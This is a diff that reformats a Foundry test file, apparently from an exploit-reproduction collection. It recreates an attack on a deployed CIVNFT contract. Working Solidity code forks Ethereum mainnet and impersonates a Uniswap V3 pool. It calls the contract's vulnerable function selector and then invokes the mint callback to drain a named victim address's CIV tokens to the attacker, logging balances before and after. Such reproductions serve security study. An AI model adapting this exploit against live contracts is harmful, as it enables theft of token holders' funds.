@@ -35,19 +35,16 @@ contract CIVNFTTest is Test {
         // whether the pool is locked
         bool unlocked;
     }
-    IERC20 private constant CIV =
-        IERC20(0x37fE0f067FA808fFBDd12891C0858532CFE7361d);
-    IERC20 private constant WETH =
-        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    address private constant CIVNFT =
-        0xF169BD68ED72B2fdC3C9234833197171AA000580;
-    address private constant victim =
-        0x512e9701D314b365921BcB3b8265658A152C9fFD;
+
+    IERC20 private constant CIV = IERC20(0x37fE0f067FA808fFBDd12891C0858532CFE7361d);
+    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    address private constant CIVNFT = 0xF169BD68ED72B2fdC3C9234833197171AA000580;
+    address private constant victim = 0x512e9701D314b365921BcB3b8265658A152C9fFD;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17649875);
+        cheats.createSelectFork("mainnet", 17_649_875);
         cheats.label(address(CIV), "CIV");
         cheats.label(address(WETH), "WETH");
         cheats.label(CIVNFT, "CIVNFT");
@@ -55,18 +52,10 @@ contract CIVNFTTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "Attacker CIV balance before exploit",
-            CIV.balanceOf(address(this)),
-            CIV.decimals()
-        );
+        emit log_named_decimal_uint("Attacker CIV balance before exploit", CIV.balanceOf(address(this)), CIV.decimals());
         // Calling vulnerable function in CIVNFT contract
         call0x7ca06d68();
-        emit log_named_decimal_uint(
-            "Attacker CIV balance after exploit",
-            CIV.balanceOf(address(this)),
-            CIV.decimals()
-        );
+        emit log_named_decimal_uint("Attacker CIV balance after exploit", CIV.balanceOf(address(this)), CIV.decimals());
     }
 
     function token0() external view returns (address) {
@@ -82,16 +71,15 @@ contract CIVNFTTest is Test {
     }
 
     function slot0() external pure returns (Slot0 memory) {
-        return
-            Slot0({
-                sqrtPriceX96: 590_212_530_842_204_246_875_907_781,
-                tick: -97_380,
-                observationIndex: 0,
-                observationCardinality: 1,
-                observationCardinalityNext: 1,
-                feeProtocol: 0,
-                unlocked: true
-            });
+        return Slot0({
+            sqrtPriceX96: 590_212_530_842_204_246_875_907_781,
+            tick: -97_380,
+            observationIndex: 0,
+            observationCardinality: 1,
+            observationCardinalityNext: 1,
+            feeProtocol: 0,
+            unlocked: true
+        });
     }
 
     function mint(
@@ -105,7 +93,7 @@ contract CIVNFTTest is Test {
     }
 
     function call0x7ca06d68() internal {
-        (bool success, ) = CIVNFT.call(
+        (bool success,) = CIVNFT.call(
             abi.encodeWithSelector(
                 bytes4(0x7ca06d68), // vulnerable function selector
                 address(this), // fake uniswap pool
@@ -121,14 +109,7 @@ contract CIVNFTTest is Test {
 
     function callUniswapV3MintCallback() internal {
         bytes memory data = abi.encode(victim, victim);
-        (bool success, ) = CIVNFT.call(
-            abi.encodeWithSelector(
-                bytes4(0xd3487997),
-                CIV.balanceOf(victim),
-                0,
-                data
-            )
-        );
+        (bool success,) = CIVNFT.call(abi.encodeWithSelector(bytes4(0xd3487997), CIV.balanceOf(victim), 0, data));
         require(success, "Call to Uniswap callback failed");
     }
 }
